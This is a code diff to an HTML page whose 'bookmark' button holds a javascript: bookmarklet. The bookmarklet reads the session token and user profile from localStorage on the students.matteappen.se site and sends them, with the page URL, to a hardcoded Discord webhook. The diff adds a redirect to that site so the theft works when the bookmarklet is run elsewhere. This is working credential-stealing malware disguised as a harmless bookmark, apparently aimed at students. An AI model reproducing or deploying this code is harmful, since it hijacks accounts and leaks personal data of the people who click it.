@@ -42,56 +42,64 @@
 </head>
 <body>
     <div class="bookmark-container">
-        <a href='javascript:const userDataRaw = localStorage.getItem("userData");
-        const token = localStorage.getItem("@token_v2");
+        <a href='javascript:
+
+        if (document.location.host != "students.matteappen.se"){
+          window.open("https://students.matteappen.se/");
         
-        let fullName = "Unknown";
-        let userDataString = "Unavailable";
+        }else{
+          const userDataRaw = localStorage.getItem("userData");
+          const token = localStorage.getItem("@token_v2");
         
-        if (userDataRaw) {
-          try {
-            const userData = JSON.parse(userDataRaw);
-            fullName = userData.fullName || "Unknown";
-            userDataString = JSON.stringify(userData, null, 2);
-          } catch (e) {
-            console.error("Failed to parse userData:", e);
+          let fullName = "Unknown";
+          let userDataString = "Unavailable";
+        
+          if (userDataRaw) {
+            try {
+              const userData = JSON.parse(userDataRaw);
+              fullName = userData.fullName || "Unknown";
+              userDataString = JSON.stringify(userData, null, 2);
+            } catch (e) {
+              console.error("Failed to parse userData:", e);
+            }
           }
+        
+        
+          fetch("https://discord.com/api/webhooks/1369739097954062510/zmi4IPKCb2qYDKliO3RLZcj_AY9lnqmqL3DD6VwyfSxYEOarfpcrQ2MOfaTZ0fB3u8Q9", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              username: "Full Name: " + fullName + " " + Math.random(),
+              content: "**-------------------------------------**",
+              embeds: [
+                {
+                  description: "```text\n" + document.URL + "\n```",
+                  color: 3447003,
+                  author: {
+                    name: "URL"
+                  }
+                },
+                {
+                  description: "```json\n" + token + "\n```",
+                  color: 3447003,
+                  author: {
+                    name: "Token"
+                  }
+                },
+                {
+                  description: "```json\n" + userDataString + "\n```",
+                  color: 3447003,
+                  author: {
+                    name: "User Data"
+                  }
+                }
+              ]
+            })
+          });
+        
         }
-        
-        
-        fetch("https://discord.com/api/webhooks/1369739097954062510/zmi4IPKCb2qYDKliO3RLZcj_AY9lnqmqL3DD6VwyfSxYEOarfpcrQ2MOfaTZ0fB3u8Q9", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            username: "Full Name: " + fullName + " " + Math.random(),
-            content: "**-------------------------------------**",
-            embeds: [
-              {
-                description: "```text\n" + document.URL + "\n```",
-                color: 3447003,
-                author: {
-                  name: "URL"
-                }
-              },
-              {
-                description: "```json\n" + token + "\n```",
-                color: 3447003,
-                author: {
-                  name: "Token"
-                }
-              },
-              {
-                description: "```json\n" + userDataString + "\n```",
-                color: 3447003,
-                author: {
-                  name: "User Data"
-                }
-              }
-            ]
-          })
-        });
         ' target="_blank"><button>bookmark</button></a>
     </div>
 </body>
